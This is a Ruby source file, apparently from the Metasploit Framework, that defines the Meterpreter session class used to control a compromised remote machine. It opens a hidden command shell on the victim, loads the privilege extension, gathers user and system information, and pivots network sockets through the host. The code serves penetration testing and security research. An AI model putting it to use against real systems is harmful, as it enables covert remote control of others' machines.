##
# $Id$
##

require 'msf/base'
require 'msf/base/sessions/scriptable'
require 'rex/post/meterpreter'

module Msf
module Sessions

###
#
# This class represents a session compatible interface to a meterpreter server
# instance running on a remote machine.  It provides the means of interacting
# with the server instance both at an API level as well as at a console level.
#
###
class Meterpreter < Rex::Post::Meterpreter::Client

	#
	# The meterpreter session is interactive
	#
	include Msf::Session
	include Msf::Session::Interactive
	include Msf::Session::Comm

	#
	# This interface supports interacting with a single command shell.
	#
	include Msf::Session::Provider::SingleCommandShell

	include Msf::Session::Scriptable

	# Override for server implementations that can't do ssl
	def supports_ssl?
		true
	end
	def supports_zlib?
		true
	end

	#
	# Initializes a meterpreter session instance using the supplied rstream
	# that is to be used as the client's connection to the server.
	#
	def initialize(rstream, opts={})
		super

		opts[:capabilities] = {
			:ssl => supports_ssl?,
			:zlib => supports_zlib?
		}
		if not opts[:skip_ssl]
			# the caller didn't request to skip ssl, so make sure we support it
			opts.merge!(:skip_ssl => (not supports_ssl?))
		end

		#
		# Initialize the meterpreter client
		#
		self.init_meterpreter(rstream, opts)

		#
		# Create the console instance
		#
		self.console = Rex::Post::Meterpreter::Ui::Console.new(self)
	end

	#
	# Returns the session type as being 'meterpreter'.
	#
	def self.type
		"meterpreter"
	end

	#
	# Calls the class method
	#
	def type
		self.class.type
	end

	def shell_init
		return true if @shell

		# COMSPEC is special-cased on all meterpreters to return a viable
		# shell.
		sh = fs.file.expand_path("%COMSPEC%")
		@shell = sys.process.execute(sh, nil, { "Hidden" => true, "Channelized" => true })

	end

	#
	# Read from the command shell.
	#
	def shell_read(length=nil, timeout=1)
		shell_init

		length = nil if length < 0
		begin
			rv = nil
			# Meterpreter doesn't offer a way to timeout on the victim side, so
			# we have to do it here.  I'm concerned that this will cause loss
			# of data.
			Timeout.timeout(timeout) {
				rv = @shell.channel.read(length)
			}
			framework.events.on_session_output(self, rv) if rv
			return rv
		rescue ::Timeout::Error
			return nil
		rescue ::Exception => e
			shell_close
			raise e
		end
	end

	#
	# Write to the command shell.
	#
	def shell_write(buf)
		shell_init

		begin
			framework.events.on_session_command(self, buf.strip)
			len = @shell.channel.write(buf + "\r\n")
		rescue ::Exception => e
			shell_close
			raise e
		end
	end

	def shell_close
		@shell.close
		@shell = nil
	end

	def shell_command(cmd)
		# Send the shell channel's stdin.
		shell_write(cmd + "\n")

		timeout = 5
		etime = ::Time.now.to_f + timeout
		buff = ""
		
		# Keep reading data until no more data is available or the timeout is 
		# reached. 
		while (::Time.now.to_f < etime)
			res = shell_read(-1, 0.1)
			buff << res if res
		end

		buff
	end

	#
	# Called by PacketDispatcher to resolve error codes to names.
	# This is the default version (return the number itself)
	#
	def lookup_error(code)
		"#{code}"
	end

	##
	#
	# Msf::Session overrides
	#
	##

	#
	# Cleans up the meterpreter client session.
	#
	def cleanup
		cleanup_meterpreter

		super
	end

	#
	# Returns the session description.
	#
	def desc
		"Meterpreter"
	end


	##
	#
	# Msf::Session::Scriptable implementors
	#
	##

	#
	# Runs the meterpreter script in the context of a script container
	#
	def execute_file(full_path, args)
		o = Rex::Script::Meterpreter.new(self, full_path)
		o.run(args)
	end


	##
	#
	# Msf::Session::Interactive implementors
	#
	##

	#
	# Initializes the console's I/O handles.
	#
	def init_ui(input, output)
		self.user_input = input
		self.user_output = output
		console.init_ui(input, output)
		console.set_log_source(log_source)

		super
	end

	#
	# Resets the console's I/O handles.
	#
	def reset_ui
		console.unset_log_source
		console.reset_ui
	end

	#
	# Terminates the session
	#
	def kill
		begin
			cleanup_meterpreter
			self.sock.close
		rescue ::Exception
		end
		framework.sessions.deregister(self)
	end

	#
	# Run the supplied command as if it came from suer input.
	#
	def queue_cmd(cmd)
		console.queue_cmd(cmd)
	end

	#
	# Explicitly runs a command in the meterpreter console.
	#
	def run_cmd(cmd)
		console.run_single(cmd)
	end

	#
	# Load the stdapi extension.
	#
	def load_stdapi()
		original = console.disable_output
		console.disable_output = true
		console.run_single('use stdapi')
		console.disable_output = original
	end

	#
	# Load the priv extension.
	#
	def load_priv()
		original = console.disable_output

		console.disable_output = true
		console.run_single('use priv')
		console.disable_output = original
	end

	#
	# Populate the session information.
	#
	def load_session_info()
		begin
			::Timeout.timeout(60) do
				username  = self.sys.config.getuid
				sysinfo   = self.sys.config.sysinfo
				self.info = "#{username} @ #{sysinfo['Computer']}"
			end
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			# $stderr.puts "ERROR: #{e.class} #{e} #{e.backtrace}"
		end
	end

	#
	# Interacts with the meterpreter client at a user interface level.
	#
	def _interact
		framework.events.on_session_interact(self)
		# Call the console interaction subsystem of the meterpreter client and
		# pass it a block that returns whether or not we should still be
		# interacting.  This will allow the shell to abort if interaction is
		# canceled.
		console.interact { self.interacting != true }

		# If the stop flag has been set, then that means the user exited.  Raise
		# the EOFError so we can drop this bitch like a bad habit.
		raise EOFError if (console.stopped? == true)
	end


	##
	#
	# Msf::Session::Comm implementors
	#
	##

	#
	# Creates a connection based on the supplied parameters and returns it to
	# the caller.  The connection is created relative to the remote machine on
	# which the meterpreter server instance is running.
	#
	def create(param)
		sock = nil

		# Notify handlers before we create the socket
		notify_before_socket_create(self, param)

		sock = net.socket.create(param)

		# sf: unsure if we should raise an exception or just return nil. returning nil for now.
		#if( sock == nil )
		#  raise Rex::UnsupportedProtocol.new(param.proto), caller
		#end

		# Notify now that we've created the socket
		notify_socket_created(self, sock, param)

		# Return the socket to the caller
		sock
	end

	attr_accessor :platform
	attr_accessor :binary_suffix
	attr_accessor :console # :nodoc:
	attr_accessor :skip_ssl
	attr_accessor :target_id

protected

	attr_accessor :rstream # :nodoc:

end

end
end

